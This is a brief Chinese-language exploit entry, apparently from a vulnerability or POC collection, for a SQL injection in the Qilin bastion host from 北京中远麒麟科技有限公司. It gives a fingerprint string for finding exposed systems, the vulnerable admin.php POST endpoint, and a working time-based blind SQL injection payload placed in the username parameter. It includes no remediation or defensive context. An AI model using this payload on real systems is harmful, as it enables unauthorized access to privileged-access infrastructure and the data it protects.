# 北京中远麒麟科技有限公司麒麟堡垒机存在SQL注入漏洞

北京中远麒麟科技有限公司麒麟堡垒机 ｜ SQL注入 ｜ —
- **指纹**：`body="url=\"`
- **请求**：`POST /admin.php?controller=admin_commonuser HTTP/1.1`

**Payload**
```
username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
```